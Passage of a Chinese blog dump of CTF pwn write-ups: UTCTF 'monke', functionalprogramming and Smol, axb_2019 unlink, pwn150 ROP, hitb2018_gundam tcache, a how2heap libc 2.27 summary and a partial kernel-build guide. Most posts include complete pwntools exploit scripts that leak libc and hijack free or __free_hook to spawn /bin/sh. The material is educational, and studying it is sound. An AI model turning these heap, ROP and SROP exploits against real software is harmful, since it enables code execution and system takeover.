ends\n```\n\n打印内容的时候是通过inventory[idx]->banana来打印的，所以如果我们可以把banana的指针指向got表，那么就可以打印出got表中函数的真实地址，从而泄露出libc基地址，这样通过libc基地址和UAF漏洞直接劫持free函数，构造system(\"/bin/sh\")即可。\n\n▲思考如何将banana指针指向got表：漏洞点同样也在free函数，由于在malloc时会申请一个0x20大小的chunk来存放banana的地址和size，用来管理banana。但是在free的时候却没有free掉这个0x20大小的chunk。\n\n(1)先申请一个0x20大小的banana0，进入隐藏选项，然后free掉，banana0进入tcache中，但是inventory[0]并没有被置0。\n\n(2)再申请一个0x20大小的banana1，将banan0申请回来，这时管理banana1的chunk就变成了banan0，这样就可以通过inventory[0]来修改banan0从而修改管理banan1的chunk，使得原本指向banan1的指针指向free的got表。\n\n(3)之后再通过选项2，就可以打印inventory[0].banana1的内容，也就是free的got表中的真实地址。\n\n2.开始编写exp:\n\n(1)首先泄露基地址：\n\n```\n#注释头\n\nfind_banana(\"a\", 4)\n\n#跳转至隐藏选项，将can_eat置零。\nwalk(\"0\")\n\n#吃掉香蕉，使得banana0进入tcache中，方便之后申请回来，同时inventory[0]没有置零。\neat(0)\n\n#申请banana1，将banana0申请回来，使得管理banana1的chunk变成banana0，方便之后修改。\nfind_banana(\"b\", 8)\n\n#将*(inventory[0].banana)修改为free的got表\nrename(0, p64(elf.got[\"free\"]))\nsh.sendline(\"s\")\nskip_menu()\n\n# 展示inventory，从inventory[0].banana对应的内存上泄露地址\nsh.sendline(\"2\")\nsh.recvline()\nsh.recvline()\nfree = u64(sh.recvline()[3:].strip().ljust(8, b\"\\x00\"))\n\n#计算得到libc基地址：\nlibc.address = free - libc.symbols[\"free\"]\nlog.info(f\"libc base leaked @ 0x{libc.address:x}\")\n```\n\n(2)劫持free函数为system函数：\n\n```\n#注释头\n\n#此时inventory[1].banana的值应该是free的got表，那么此时修改\n#inventory[1].banana.content就会直接修改free的got表，从而劫持函数\nsh.sendline(\"1\")\nsh.recvline()\nsh.sendline(\"rename\")\nsh.recvline()\nsh.sendline(p64(libc.symbols[\"system\"]))\n```\n\n(3)再申请一个内容为/bin/sh字符串的chunk，释放掉即可getshell：\n\n```\n#注释头\n\nfind_banana(\"/bin/sh\", 10)\neat(2, True)\nsh.interactive()\n```\n\n(4)前置函数：\n\n```\n#注释头\n\nelf = ELF(\"./monke\")\nlibc = ELF(\"./libc-2.27.so\")\nsh = elf.process()\n#sh = remote(\"pwn.utctf.live\", 9999)\n\n\ndef skip_menu():\n    global sh\n    sh.recvuntil(\"2: inventory\\n\")\n    return bool(sh.recvline(timeout=0.5))\n\ndef walk(where=\"s\"):\n    global sh\n    sh.sendline(\"0\")\n    sh.sendlineafter(\"[n|s|e|w]\", where)\n    return skip_menu()\n\n\ndef find_banana(name, length):\n    global sh\n    while not walk():\n        pass\n    sh.sendline(\"3\")\n    sh.sendlineafter(\"How long would you like the name to be:\", str(length))\n    sh.sendlineafter(\"What would you like to name it:\", name)\n    skip_menu()\n\n\ndef eat(idx, end = False):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"eat\")\n    sh.recvline()\n    if not end:\n        skip_menu()\n\ndef rename(idx, name):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"rename\")\n    sh.recvline()\n    sh.sendline(name)\n    skip_menu()\n```\n\n \n\n二、functionalprogramming：\n\n1.常规IDA，checksec分析，RELRO没开。程序本身很简单，输入function，parameter和element可以构造一个函数，然后调用。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png)\n\n2.然后程序运行过程中会泄露出libc地址和，直接从网站https://libc.blukat.me/来找版本，或者使用其他工具也可以，利用泄露出来的abs函数地址，即可得知libc版本为libc6_2.23-0ubuntu11.2_amd64。\n\n3.然后根据程序，即可构造system(\"/bin/sh\")，或者利用onegadget也可以，这里直接贴exp吧。\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\nio = remote('pwn.utctf.live',5433)\n#io = process('./functionalprogramming')\nonegadget = 0xf0364\n\nio.sendline('1')\nio.sendline('1')\nio.recvuntil(\"Abs: \")\nlibc_abs = int(io.recv()[2:14],16)\nlibc_base = libc_abs-0x3a640\nlog.info('libc_abs:%x'%libc_abs)\nlog.info('libc_base:%x'%libc_base)\nio.sendline('1')\n\n#io.sendline('1')\npayload = \"\"\npayload += hex(libc_base+onegadget)\npayload = payload.replace('0x','')\n\nio.send(payload)\nio.interactive()\n```\n\n \n\n三、Smol复现：\n\n1.没啥好分析的，栈溢出漏洞，什么保护都没开，存在BSS段，常规SROP，利用栈劫持到BSS段，懂的都懂。\n\n2.直接贴exp:\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\ncontext.update(os = 'linux', arch = 'amd64')\nio = remote(\"pwn.utctf.live\",9998)\n\npayload = \"\"\npayload += p64(0x402000+0x10)\npayload += p64(0x402000+0x10) #addr 0x402008\npayload += p64(0x401015) #rsp = 0x402020\nio.send(payload)\n\nframe_execve = SigreturnFrame() #设置execve的SROP帧，注意计算/bin/sh\\x00所在地址\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = 0x402008\nframe_execve.rip = 0x40103D #syscall_addr\n\npayload2 = \"\"\npayload2 += \"/bin/sh\\x00\"        #0x402008\npayload2 += p64(0x402000+0x10)   #0x402010\npayload2 += p64(0x401015)        #0x402018\npayload2 += p64(0x402000+0x30)   #0x402020\npayload2 += \"A\"*0x10             #0x402028\npayload2 += p64(0x40103D)\npayload2 += str(frame_execve)    #0x402038\nio.send(payload2)\n\n#buf = 0x402008\n#rsp = 0x402020\n#rbp = 0x402010 ->0x402010\n\npayload3 = payload2[0:8]\npayload3 += \"\\x30\\x20\\x40\\x00\\x00\\x00\\x00\"\nio.send(payload3)\n\nio.interactive()\n```\n\n但是这里调试了好一段时间，需要再仔细分析一点，下回争取早点解决类似的题目。\n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"axb_2019_heap-unlink","url":"/2021/08/14/axb_2019_heap-unlink/","content":"\n1.最开始看源码，感觉还行，能看懂，但是一旦看其他人讲unlink，感觉完全对不上，分明就是瞎搞，之后调试才发现单独的unlink攻击并不是针对chunk的，而是针对具体题目的结构体的。并且要求程序可以修改掉chunk的size位，执行向上合并从而触发unlink。\n\n2.unlink攻击流程如下：\n\n(1)找到题目中的chunklist位置，并分清结构体中是size在前还是chunk在前。\n\n(2)这里假设我们想要控制chunklist[0]中的chunk。申请chunk0,chunk1,chunk2。在chunk0中构造fakechunk，并设置：\n\n```\n#注释头\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)通过堆溢出或者off-by-one将chunk1的pre_size设置成fakechunk_size，将chunk1的size设置成fakechunk_size+chunk1_size。\n\n(4)free掉chunk1，这样就会触发向上合并，将fakechunk和chunk1合并。同时，由于合并过程中调用了unlink函数，那么chunklist[0].chunk就会指向chunlist_addr-0x18，对应的就是我们的chunk0指向chunklist_addr-0x18。\n\n▲unlink源码：\n\n```\n#注释头\n\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\nmalloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\nFD->bk = BK;\nBK->fd = FD;\n```\n\nA.首先通过fakechunk，也就是p，找到前一个chunk和后一个chunk:\n\n```\n#注释头\n\nFD = P->fd;\nBK = P->bk;\n```\n\n这里的FD和BK分别为fakechunk的前一个chunk和后一个chunk，也就是chunklist_addr-0x18和chunklist_addr-0x10。\n\nB.然后过检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\n能过检查的原因就是因为FD->bk就相当于是[chunklist_addr-0x18]+[0x18]，就相当于chunklist_addr，也就是chunklist[0].chunk。而该地址中保存的内容就是fakechunk_addr。\n\n注意chunk0_addr和fakechunk_addr不是一样的，因为有chunk结构的原因，如下图，可以看到实际上chunklist[n].chunk保存的值是chunk数据部分的地址，在这里也就相当于是fakechunk_addr。所以也就能过检查。同理BK->fd相当于是[chunklist_addr-0x10]+[0x10]，等于chunklist_addr，该地址中保存的值就是fakechunk_addr。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533541.jpeg)\n\nC.过完检查之后，就来到赋值部分\n\n```\n#注释头\n\nFD->bk = BK;\nBK->fd = FD;\n```\n\n那么现在FD->bk = BK相当于[chunklist_addr-0x18]+[0x18]，也就是chunklist_addr中的值被赋值为chunklist_addr-0x10，之后BK->fd = FD，就是chunklist_addr中的值被赋值为chunklist_addr-0x18，所以总的来说，chunklist[0].chunk会指向chunklist_addr-0x18，也就是说我们的fakechunk指向chunklist_addr-0x18，这样就相当于可以通过修改fakechunk就可以修改chunklist这个bss段上的内容。而fakechunk又是chunk0的数据部分，完全在我们的掌控范围。\n\n(5)现在修改chunk0数据就先当于修改chunklist这个bss段上的内容。\n\n3.在这道题中，原本chunklist[0].chunk中保存的值是fakechunk_addr，我们可以修改chunklist[0].chunk中保存的值为free_hook地址，那么之后再修改chunk0数据部分就相当于修改free_hook中的内容了。那么现在就可以将free_hook保存的值修改为system的真实地址，这样在free时就相当于调用system函数，那么一旦free某个chunk，而该chunk的数据部分为binsh字符串，那么就相当于调用system(\"/bin/sh\")，从而getshell.\n\n4.现在开始分析这道题目，get_input函数中存在off-by-one，banner()函数中存在格式化字符串漏洞：\n\nget_input:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533283.jpeg)\n\nbanner:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533339.jpeg)\n\n利用格式化字符漏洞泄露Libc从而得到其它所有地址。之后通过off-by-one进行unlink攻击，构造fakechunk到chunklist这个Bss段上，修改chunklist段上的chunklist[0].chunk，使其指向free_hook_addr。之后再通过修改chunk0从而修改free_hook为system真实地址，再申请某个数据部分为binsh字符串的chunk，释放掉就能getshell。\n\n总exp如下：\n\n(1)首先增删改查函数：\n\n```\n#注释头\n\ndef add(index,size,content):\n    p.sendlineafter('>> ','1')\n    p.sendlineafter('Enter the index you want to create (0-10):',str(index))\n    p.sendlineafter('Enter a size:',str(size))\n    p.sendlineafter('Enter the content:',content)\n\ndef free(index):\n    p.sendlineafter('>> ','2')\n    p.sendlineafter('Enter an index:',str(index))\n\ndef edit(index,content):\n    p.sendlineafter('>> ','4')\n    p.sendlineafter('Enter an index:',str(index))\n    p.sendafter('Enter the content:',content)\n```\n\n(2)利用格式化字符漏洞泄露栈上的__libc_main和main地址：\n\n```\n#注释头\n\np.sendline('%11$p%15$p')\np.recvuntil('Hello,')\nbase = hex(int(p.recv(14),16)-0x116a - 28)\nlibcbase = hex(int(p.recv(14),16) - 240 - libc.sym['__libc_start_main'])\nchunklist = hex(base + 0x202060)\nfree_hook = libcbase + libc.sym['__free_hook']\nsystem = libcbase + libc.sym['system']\n```\n\n(3)利用off-by-one向上合并chunk0和chunk1，执行unlink攻击：\n\n```\n#注释头\n\nadd(0,0x98,'aaaa')#0\nadd(1,0x98,'bbbb')#1\nadd(2,0x90,'cccc')#2\nadd(3,0x90,'/bin/sh\\x00')#3\n\npayload=p64(0)+p64(0x91)+p64(chunklist-0x18)+p64(chunklist-0x10)+p64(0)*14+p64(0x90)+'\\xa0'\nedit(0,payload)\ndelete(1)\n```\n\n(4)修改chunklist[0].chunk指向free_hook：\n\n```\n#注释头\n\nedit(0,p64(0)*3+p64(free_hook)+p64(0x10))\n#由于unlink攻击赋值之后，chunk0数据部分指向了chunklist_addr-0x18位置，所以需要填充p64(0)*3\n```\n\n(5)修改free_hook为system：\n\n```\n#注释头\n\nedit(0,p64(system))\n```\n\n(6)利用free触发system，getshell\n\n```\n#注释头\n\nfree(3)\np.interactive()\n```\n\n \n\n \n\n \n\n \n","tags":["unlink"],"categories":["PWN","pwn堆-unlink"]},{"title":"bugs bunny ctf 2017-pwn150","url":"/2021/08/14/bugs bunny ctf 2017-pwn150/","content":"\n \n\n1.常规checksec，可以发现NX enabled，并且没有RAX字段。打开IDA后可以看到在hello函数中存在栈溢出：\n\n```\n#注释头\n\nchar s; // [rsp+0h] [rbp-50h]\n---------------------------------------------------------------\nfgets(&s, 192, stdin);\n```\n\n然后分析程序，汇编代码什么的，没找到有call eax之类的操作，这里就选择ROP来getshell。\n\n2.由于是64位程序，传参方式不同，依次为：rdi, rsi, rdx, rcx, r8, r9, 栈，而我们的目标是跳转system函数，让system函数读取binsh字符串，system函数又只有一个参数，所以这个参数必然需要在rdi中读取。我们的输入是位于栈上，所以需要一个pop rdi;和ret的操作命令，让我们的输入赋值给rdi寄存器。\n\n3.在哪找pop rdi; ret;也是个问题，这里有个工具可以实现ROPgadget ，在linux下可以输入：以下代码来获取代码地址。\n\n```\n#注释头\n\nROPgadget --binary pwn150 | grep \"pop rdi\"\n```\n\n4.然后需要system函数的地址，这里today函数直接call了该函数，所以可以直接用IDA在汇编中看到该地址(行的前缀)。或者先ctrl + s，在got.plt中搜索一下，发现也能找到system函数。所以这里获取system地址我们可以有两种方法：\n\n①pop rdi之后，让ret指向today函数中的call_system_地址：0x40075F\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191553103.jpeg)\n\n②pop rdi之后，让ret指向从elf = ELF('./pwn150')和system_addr = p64(elf.symbols['system'])中找到的地址system_addr，也就是plt表中的地址(这里其实可以直接在IDA中找到)\n\n(但是需要注意的是，这是64位程序，system函数从rdi上取值，与栈无关系，所以call和直接跳转plt差不多，但是如果是32位程序，那么布置栈的时候就需要考虑到plt表和直接call system函数的不同了。如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：\n\n**system函数-system函数的返回地址-sytem函数的参数。**\n\n但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：\n\n**call system函数地址-system函数参数。**\n\n两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)\n\n4.接下来寻找binsh字符串，但是没找到，只有sh，也可以开shell。shift+F12进入字符串后右键在十六进制中同步，之后可以对应看到sh的字符地址，由于sh之后直接就是结束字符00，不会往后多读，而只会读取sh，所以可以直接将该字符串的地址写在pop rdi地址后面，直接赋值给rdi，写进去。\n\n5.编写payload，顺序为：payload = padding + pop_rdi_addr + bin_sh_addr + system_addr（或者是call_system_addr）。\n\n \n\n▲由于64位程序中通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。也就是ROPgadget --pwn150 | grep “pop rdi”这段代码获取。所以进入system中用call和return直接进都行，参数是从rdi中获取的，进去之后栈上的返回地址是啥都没关系，因为已经getshell，用不到。\n\n▲执行call func_addr指令相当于push eip ;jmp func_addr，而执行plt表中地址则相当于只有jmp func_addr，没有前面的push eip，所以需要手动设置这个eip，而call则不用。注意这是32位程序下，64位程序下则按照本篇所说，直接pop rdi即可。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"hitb2018_gundam","url":"/2021/08/14/hitb2018_gundam/","content":"\n1.常规checksec，保护全开。IDA打开找漏洞，在删除函数sub_D32()中存在Double free和UAF漏洞：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515866.jpeg)\n\n通过逆向分析，结构体重整化：\n\n```\n#注释头\n\nstruct gundam\n{\nint flag;\nchar *name;\nchar type[24];\n}gundam;\n\nstruct gundam* factory[9]\n```\n\n之后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515821.jpeg)\n\n(1)Double free:可以看到在删除函数中，程序通过factory[idx]和count来判断gundam是否存在，并且只是free掉了factory[idx]->name这个chunk，并且将flag置空，但是并没有将factory[idx]这个指针置空。而且这是在Tcache机制下，没有对Double free的检查，那么就代表如果其实我们是可以连续多次free掉factory[idx]->name这个chunk的。\n\n(2)UAF:另外factory[idx]->name这个指针也没有置空，可以通过factory[idx]再次利用，形成UAF漏洞。\n\n2.思考利用方式:由于libc版本是2.26，从unsortedbins中申请回的chunk如果不被程序更改内容，其fd和bk仍然保存，可以泄露地址。由于build的时候，没有将name这个chunk的内容初始化为0，所以该chunk如果进入unsortedbin中之后，fd被赋值为main_arena+88，那么申请回来之后，name中的bk就带有main_arena+88的地址，可以通过visit打印出来，从而计算得到，泄露libc基地址。\n\n(1)那么先填满tcache之后，再加个chunk，使其进入unsorted bin中，然后申请回来就可以得到libc地址了。\n\n(2)得到libc地址后，由于libc版本是2.26，仍然存在tcache poisoning漏洞，就可以通过Double free漏洞进行类似fastbins attack攻击。\n\n```\n#注释头\n\n假如申请chunk0,chunk1，然后连续free(chunk0)两次，这样tcache bin中就是：\nchunk0.fd ->chunk0，即chunk0->chunk0\n那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：\nchunk0.fd->fakechunk，即chunk0->fakechunk\n之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。\n★这个漏洞在libc2.27及之后就被修复了，即不能连续free(chunk0)两次，否则程序直接崩溃。\n```\n\n①先申请三个chunk，chunk0,chunk1,chunk2，chunk1存放binsh字符串，chunk2用来防止被topchunk吞并。之后释放chunk0两次，那么tcache中的chunk0的fd指针就会指向自己，形成：chunk0->chunk0。\n\n②之后再申请一个chunk，对应索引为0，申请回第一个chunk0，修改name内容__free_hook_addr，而name内容的前八个字节就是chunk0的fd，即tcachebin中就会由之前的chunk0->chunk0变为chunk0->__free_hook_addr\n\n③再连续申请两个chunk，对应索引为3,4，chunk4的头地址就会是__free_hook_addr-0x10，那么修改chunk4的name中的前八个字节就相当于修改_free_hook，这里使其变为system的真实地址，再free(chunk_binsh)即可getshell。\n\n3.编写exp:\n\n(1)前置增删改查函数：\n\n```\n#注释头\n\ndef build(name):\n    io.sendlineafter(' :', \"1\")\n    io.sendafter(' :', name)\n    io.sendlineafter(' :', \"1\")\n\ndef visit():\n    io.sendlineafter(' :', \"2\")\n\ndef destory(idx):\n    io.sendlineafter(' :', \"3\")\n    io.sendlineafter(\":\", str(idx))\n\ndef blow():\n    io.sendlineafter(' :', \"4\")\n```\n\n(2)泄露地址：\n\n```\n#注释头\n\n#创建9个chunk,再删除9个chunk,7个进入tcache,1个进入unsortedbin,1个进入topchunk,这里由于有个0x28的gundam_chunk在，所以不会全部都进入topchunk\nfor i in xrange(9):\n    build(\"AAAA\")\nfor i in xrange(9):\n    destory(i)\nblow()\n#为了清空count\n\n#清空tcachebin之后再申请一个chunk就是unsortedbin中的\nfor i in xrange(7):\n    build('BBBBBBBB')\nbuild('CCCCCCCC')\n\n#leak:\nvisit()\nmain_arena = 0x3dac20\nlibc.address = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 88 - main_arena\nsuccess(\"libc -> {:#x}\".format(libc.address))\n```\n\n(3)清空count，方便计算索引:\n\n```\n#注释头\n\nfor i in xrange(8):\n    destory(i)\nblow()\n```\n\n(4)利用tcache poisoning和double free漏洞，getshell:\n\n```\n#注释头\n\nbuild(\"0000\")\nbuild(\"/bin/sh\\0\")\nbuild(\"2222\")\ndestory(0)\ndestory(0)\nbuild(p64(libc.sym['__free_hook']))\nbuild(\"/bin/sh\\0\")\nbuild(p64(libc.sym['system']))\ndestory(1)#1或者3都可以\n\nio.interactive()\n```\n\n \n\n▲这个泄露地址的漏洞在没有tcache机制的libc版本中都可以用，但是tcache poisoning只有libc2.26才可以用\n\n \n\n参考资料：\n\nctf-all-in-one\n\n \n","tags":["Tcache"],"categories":["PWN","pwn堆-Tcache"]},{"title":"how2heap_libc2.27_summary","url":"/2021/08/14/how2heap_libc2.27_summary/","content":"\n\\1. fastbin_dup:\n填满Tcache后free(a),free(b),free(a)之后即可。\n\n\\2. fastbin_reverse_into_tcache:\n(1)申请14个chunk，都释放掉0-6进入tcache，7-13进入fastbin中。(这14个chunk大小需相等)\n(2)此时mallco掉7个chunk，就可以将tcache中的7个chunk都申请出来。\n(3)再利用漏洞修改chunk7的fd为栈上的地址(任意地址)，这时再malloc一次，就会从fastbin中申请chunk，由于fastbin先进后出的关系，会将chunk13申请出来。同时由于tcache机制，当fastbin中对应大小的bin中还存在chunk，就会将这些Chunk都拿出来放进对应大小的tcache中。\n(4)由于先进后出的关系不变，拿出顺序为chunk12,chunk11…chunk7。进入tcache后的顺序为chunk7,chunk8….chunk12。\n(5)这样又由于chunk7的fd被我们改掉了，所以实际的顺序为chunk7->chunk7.fd->chunk8…\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449078.png)\n(6)同时释放可以向栈上写入堆地址，之后再连续申请就可以将从栈上申请chunk。\n\n\\3. house_of_botcake(只能在double free前提下使用)：\n(1)申请chunk0-chunk6用于填充tcache，然后申请chunk7,chunk8,chunk9，其中chunk9用于防止和topchunk合并\n(2)释放chunk0-chunk6填充tcache，释放chunk7，chunk8，发生合并进入unsortedbin中，称为chunk_U。\n(3)malloc一次，将chunk6从tcache中申请出来，然后再释放chunk8(double free)，这样chunk8就会进入tcache中。现在chunk8就会既在tcache中，又被包含在unsortedbin的chunk_C中。\n(4)再申请一次大小大于以上chunk_size的chunk_C，这个chunk_C就会将chunk_U切割，同时使得chunk_C包含chunk8，这样就可以从chunk_C修改chunk8的fd指针。\n(5)由于chunk8同时还在tcache中，那么再连续两次chunk8大小的size就可以将chunk8和chunk8.fd申请出来，实现任意地址申请堆块。\n\n\\4. house_of_einherjar(需要泄露堆地址)：\n(1)申请3个chunk，chunka,chunkb,chunkc，c的真实size大于0x100；\n(2)然后通过chunkb的堆溢出(off by one/null)，修改chunkc的in_use位为0，并且在chunkc的prev_size处伪造fake_prev_size=chunkb+chunka-0x10；\n(3)在chunka中伪造chunk，满足要求：\n&Fake_chunk = chunka+0x10\nFake_chunk->size = sizeof(chunka) -0x10+sizeof(chunkb)\nFake_chunk->fd = Fake_chunk\nFake_chunk->bk = Fake_chunk\n用以绕过unlink的检查。\n(4)随后申请7个与chunkc同大小的chunk，释放填充tcache；\n(5)释放chunkc，因为chunkc的prev_inuse位被置为0，所以会向上合并，通过fake_prev_size找到前一个堆块，即fake_chunk，并比较fake_prev_size与fake_chunk的size是否相等，如果相等则发生堆合并，进入unlink脱链。\n(6)此时合并的堆块，会被放入unsortedbin中，而此时的chunkb还处于使用状态，释放chunkb（因为其大小与前面tcache大小不同，会被放入新的tcachebin中）。\n(7)再申请一个大于chunkc大小的chunk，会直接从unsortedbin中去寻找划分，该chunk就是fakechunk+chunkb，且合理配置chunka和chunkc的大小使得能够覆盖到chunkb的数据，随后通过申请回来的该chunk改写chunkb的fd指针，将chunkb申请回来，再次申请就能够实现tcache poisoning攻击。\n这里和2.23有点不太一样，这里利用的是再释放chunkb从而使得其进入tcache，修改fd制造tcache poisoning，因为tcache不会检查size，只要fd就可以任意申请。\n\n\\5. house_of_force:一样的，没多大差别\n\n6.house_of_lore:和2.23差不多，没多大差别\n\n7.large_bin_attack:和2.23基本一样。\n\n\\8. overlapping_chunks(能够溢出修改size位)：\n只有free之后修改size的了.\n\n\\9. poison_null_byte:\n与2.23差不多，不过需要考虑到tcache的影响，有时候需要先填满tcache。一般情况是4个chunk，最后一个chunk防止合并，前三个chunk用来制造堆块重叠，但是中间其实可以插入较多的堆块，制造多个堆块重叠，方便利用。\n\n\\10. tcache_dup:基本没啥用，现在2.27也基本都修复了这个问题，不过做题的时候可以尝试一下看行不行。2.28就已经增加了key字段检查\n\n11.tcache_ house_of_spirit:\n与house_of_spirit一样，修改栈上的的chunk指针为栈上的地址，在栈上伪造chunk，只需要伪造size即可，注意in_use位的设置。同时由于tcache在free的时候不会依据chunk的size来对下一个chunk做检查，所以这里不需要伪造下一个chunk的size。\n\n\\12. tcache_poisoning：\n已经在tcache链表中的chunk，如果修改了fd，那么直接两次malloc即可获得fd对应地址的chunk，不需要构造字节错位，而且malloc之后得到的chunk其pre_size和size都是0。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449154.png)\n\n\\13. Tcache Stashing Unlink Attack(需要calloc申请chunk，能够控制smallbin的bk指针)：\n(1)申请9个chunk，chunk1-chunk9，释放chunk4-chunk9进入tcache中，释放chunk2进入tcache，再顺序释放chunk1和Chunk3进入unsortedbin中。\n(2)申请一个largebin大小的chunk，使得chunk1和chunk3被整理到smallbin中。\n(3)申请两个chunk，将chunk2和chunk9从Tcache中申请出来，使得tcache中存在两个空位。\n(4)利用UAF之类的漏洞修改chunk3的bk指向fake_chunk，这里的chunk3是smallbin中的第一个chunk：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449159.png)\n\n即为图中的0x602390的bk指针，指向一个fake_chunk，栈上的地址。\n(5)同时由于smallbin按照FIFO的顺序，所以依据bk指针进行寻找，那么如果从smallbin中申请chunk，申请顺序应该是0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10。\n(6)调用calloc，使得chunk不从tcache中申请，从smallbin中申请，那么就会触发下列在使用smallbin时，只在use tcache的宏定义中的代码：\n\n```\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n&& (tc_victim = last (bin) ) != bin)\n{\n    //如果成功获取了Chunk\n    if (tc_victim != 0)\n    {\n         // 获取 small bin 中倒数第二个 chunk 。\n        bck = tc_victim->bk;\n        //设置标志位\n        set_inuse_bit_at_offset (tc_victim, nb);\n        // 如果不是 main_arena，设置对应的标志\n        if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n        //取出最后一个Chunk\n        bin->bk = bck;\n        bck->fd = bin;\n        //将其放入到Tcache中\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n```\n\n这样就会将tc_victim，也就是这里的0x602390，通过tcache_put放入到tcache中，同时tcache_put这个函数中没有任何的安全检查，所以可以直接放入。那么由于tcache的FILO关系，依据fd来申请，0x602390的fd为0x7fffffffdd10(fakechunk)，所以会将fakechunk提到tcache的头部。同时又由于tcache中的指针指向的是chunk头部+0x10，那么在tcache中的顺序就是\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449163.png)\n\n这里的0x7fffffffdd20就是fakechunk，再次申请0xa0大小的chunk就可以将fakechunk给申请出来。同时又由于从smallbin链表中的unlink中的bck->fd = bin的赋值操作，会导致0x7fffffffdd20+0x10处会被赋值上smallbin的libc地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449165.png)\n\n这样Tcache Stashing Unlink Attack修改bk为target_addr，malloc后会控制target_addr-0x10，会在target_addr+0x10处写入main_arena_addr。\n\n14.unsafe_unlink:和2.23差不多，就只是申请的chunk使之大于0x410，从而不使用tcache。\n\n15.unsorted_bin_attack:申请较大的chunk使得从unsortedbin中重新申请chunk时不会将该大小的chunk放入对应的tcache中。或者修改tcache结构体的counts域，使得系统认为该tcache已经满了，那么就不会放入了。\n\nhttps://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack\n\n\\16. unsorted_bin_into_stack_attack：和2.23差不多，只要满足chunk的大小大于0x408从而不使用tcache即可，或者能够修改tcache结构体的count域。\n\n \n","tags":["how2heap"],"categories":["PWN","how2heap"]},{"title":"kernel编译","url":"/2021/08/14/kernel编译/","content":"\n1.安装依赖：\n\n```\n#注释头\n\nsudo apt-get install make gcc bison flex libssl-dev musl-tools\nsudo apt-get install libssl-dev\nsudo apt-get install gcc make libncurses5-dev openssl libssl-dev \nsudo apt-get install build-essential \nsudo apt-get install pkg-config\nsudo apt-get install libc6-dev\nsudo apt-get install bison\nsudo apt-get install flex\nsudo apt-get install libelf-dev\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\n```\n\n可能有些重复的，没事，够编译环境就行。\n\n2.下载kernel源码，解压，编译：\n\n```\n//注释头\n\nwget https://mirror.tuna.tsinghua.edu.cn/kernel/-------------------\ntar -zvxf linux-4.4.70.tar.gz\ncd linux-4.4.70\nmake menuconfig\n//这里进入之后直接esc保存退出即可，相关的设置来到之后生成的.config中来\n\nvim .config\n//将CONFIG_MODULE_SIG_ALL,CONFIG_MODULE_SIG_KEY和CONFIG_SYSTEM_TRUSTED_KEYS三项注释掉，编译时系统会自动生成一次性密钥来加密，另外记得把CONFIG_DEBUG_INFO=y去掉，不然新内核带debug信息超大\n//这里踩过很多坑，虚拟机直接爆炸，各种错误。\n\nmake\n```\n\n但是如果需要直接调试，则看大佬的吧：\n\nhttps://eternalsakura13.com/2018/04/13/qemu/\n\n编译完成之后在linux-4.4.70/arch/x86_64/boot/下保存bzImage，用来启动qemu，根目录下有vmlinux，用来分析。\n\n3.下载busybox源码，解压，编译，制作根目录系统\n\n```\n//注释头\n\nwget https://busybox.net/downloads/busybox-1.19.4.tar.bz2\ntar -jxvf busybox-1.30.0.tar.bz2\ncd busybox-1.30.0\nmake menuconfig \n# Busybox Settings -> Build Options -> Build Busybox as a static binary\nmake install\n```\n\n之后在busybox-1.30.0/_install/目录下就是根目录文件系统\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191459296.jpeg)\n\n然后就用cpio生成上述的rootfs.cpio，用来配合bzImage启动qemu\n\nfind ./* | cpio -H newc -o > 